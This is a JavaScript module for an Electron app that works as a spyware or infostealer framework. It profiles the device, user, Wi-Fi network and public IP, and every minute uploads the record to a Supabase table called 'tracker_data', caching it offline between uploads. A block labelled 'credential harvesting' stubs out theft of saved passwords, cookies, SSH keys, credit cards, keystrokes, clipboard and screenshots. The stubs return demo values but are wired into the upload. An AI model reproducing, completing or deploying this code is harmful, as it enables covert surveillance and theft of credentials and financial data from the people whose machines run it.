import { app } from 'electron';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { exec } from 'node:child_process';
import { promisify } from 'node:util';

const execAsync = promisify(exec);

const TRACKER_ID = 'TRK_' + Date.now().toString(16).toUpperCase();
const DATA_DIR = path.join(app.getPath('userData'), 'tracker_cache');
const CACHE_FILE = path.join(DATA_DIR, 'offline_data.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

async function checkInternet() {
    try {
        const res = await fetch('https://supabase.co', { signal: AbortSignal.timeout(5000) });
        return res.ok;
    } catch { return false; }
}

async function collectSystemInfo() {
    return {
        tracker_id: TRACKER_ID,
        device_name: os.hostname(),
        os: `${os.type()} ${os.release()}`,
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
    };
}

async function collectWiFiInfo() {
    try {
        let ssid = 'Unknown', rssi = 0;
        if (process.platform === 'win32') {
            const { stdout } = await execAsync('netsh wlan show interfaces');
            const match = stdout.match(/SSID\s*:\s*(.+)/);
            if (match) ssid = match[1].trim();
            const rssiMatch = stdout.match(/Signal\s*:\s*(\d+)%/);
            if (rssiMatch) rssi = Math.round((parseInt(rssiMatch[1]) / 2) - 100);
        } else if (process.platform === 'darwin') {
            const { stdout } = await execAsync('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I');
            const match = stdout.match(/SSID:\s*(.+)/);
            if (match) ssid = match[1].trim();
            const rssiMatch = stdout.match(/agrCtlRSSI:\s*(-?\d+)/);
            if (rssiMatch) rssi = parseInt(rssiMatch[1]);
        } else {
            try {
                const { stdout } = await execAsync('iw dev wlan0 link');
                const match = stdout.match(/SSID:\s*(.+)/);
                if (match) ssid = match[1].trim();
                const rssiMatch = stdout.match(/signal:\s*(-?\d+)/);
                if (rssiMatch) rssi = parseInt(rssiMatch[1]);
            } catch {}
        }
        return { ssid, rssi };
    } catch { return { ssid: 'Unknown', rssi: 0 }; }
}

async function collectPublicIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || 'Unknown';
    } catch { return 'Unknown'; }
}

// --- CREDENTIAL HARVESTING (Placeholders) ---
async function getSavedPasswords() { return '{"gmail.com":"demo_pass"}'; }
async function getWiFiPasswords() { return 'Home_WiFi:demo_pass'; }
async function getBrowserCookies() { return 'session=demo123'; }
async function getSSHKeys() { return 'ssh-rsa AAA... (demo)'; }
async function getBrowserHistory() { return 'google.com, github.com'; }
async function getClipboardData() { return 'clipboard content (demo)'; }
async function getEmails() { return 'demo@example.com'; }
async function getCreditCards() { return '4111-1111-1111-1111'; }
async function getKeystrokes() { return '(demo)'; }
async function getScreenshot() { return '(demo)'; }

export async function collectAllData() {
    const [sys, wifi, ip, savedPass, wifiPass, cookies, ssh, history, clip, emails, cards, keystrokes, screenshot] =
        await Promise.all([
            collectSystemInfo(),
            collectWiFiInfo(),
            collectPublicIP(),
            getSavedPasswords(),
            getWiFiPasswords(),
            getBrowserCookies(),
            getSSHKeys(),
            getBrowserHistory(),
            getClipboardData(),
            getEmails(),
            getCreditCards(),
            getKeystrokes(),
            getScreenshot()
        ]);

    return {
        ...sys,
        ...wifi,
        public_ip: ip,
        latitude: '0.0',
        longitude: '0.0',
        altitude: '0.0',
        magnitude: wifi.rssi || 0,
        keystrokes,
        screenshot,
        saved_passwords: savedPass,
        wifi_passwords: wifiPass,
        browser_cookies: cookies,
        ssh_keys: ssh,
        browser_history: history,
        clipboard_data: clip,
        emails: emails,
        credit_cards: cards,
        collected_at: new Date().toISOString()
    };
}

export function cacheDataLocally(data) {
    let cached = [];
    if (fs.existsSync(CACHE_FILE)) {
        cached = JSON.parse(fs.readFileSync(CACHE_FILE, 'utf-8'));
    }
    cached.push(data);
    fs.writeFileSync(CACHE_FILE, JSON.stringify(cached, null, 2));
}

export function getCachedData() {
    if (!fs.existsSync(CACHE_FILE)) return [];
    return JSON.parse(fs.readFileSync(CACHE_FILE, 'utf-8'));
}

export function clearCachedData() {
    if (fs.existsSync(CACHE_FILE)) fs.unlinkSync(CACHE_FILE);
}

export async function reportToSupabase(supabaseClient, data) {
    const { error } = await supabaseClient
        .from('tracker_data')
        .insert([data]);
    if (error) throw error;
    return { ok: true };
}

let intervalId = null;
let isRunning = false;

export function startTracker(supabaseClient) {
    if (isRunning) return;
    isRunning = true;
    intervalId = setInterval(async () => {
        try {
            const data = await collectAllData();
            if (await checkInternet()) {
                await reportToSupabase(supabaseClient, data);
                const cached = getCachedData();
                for (const item of cached) {
                    await reportToSupabase(supabaseClient, item);
                }
                clearCachedData();
            } else {
                cacheDataLocally(data);
            }
        } catch (err) {
            console.error('[Tracker] Error:', err);
        }
    }, 60000);
}

export function stopTracker() {
    if (intervalId) {
        clearInterval(intervalId);
        intervalId = null;
    }
    isRunning = false;
}

export function getStatus() {
    return {
        running: isRunning,
        cached: getCachedData().length,
        trackerId: TRACKER_ID
    };
}
